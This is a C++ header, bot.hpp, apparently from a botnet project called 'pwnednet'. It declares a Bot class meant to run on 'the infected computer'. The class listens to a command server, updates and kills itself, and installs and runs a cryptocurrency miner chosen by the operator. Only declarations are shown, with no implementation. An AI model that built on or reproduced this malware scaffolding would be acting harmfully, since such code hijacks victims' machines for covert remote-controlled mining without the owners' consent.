//
//  bot.hpp
//  pwnednet
//
#pragma once

#include "include.h"

class Bot
{
public:
    
    string version;     // Bot version
    string hwid;        // Bot hwid
    
    int cores;          // Number of cores / CPUs the infected computer has
    
    bool shouldmine;    // Whether or not the bot should mine
    bool mining;        // If the bot is mining
    
    string coin;        // The cryptocurrency the bot should mine
    
    
    bool update;        // Whether or not the bot should update
    
    
    bool kill;          // Whether or not the bot should be killed
    
    
    
    void init();        // Initialise the bots
    void Listen();      // Listen to the server for commands
    void Update();      // Update the bot
    void Kill();        // Kill the bot
    
    void installMiner();// Install the miner
    void LoadMiner();   // Run the miner
    
    
private:
    
    
};

extern Bot* bot;

extern string BotName;  // The filename of the bot
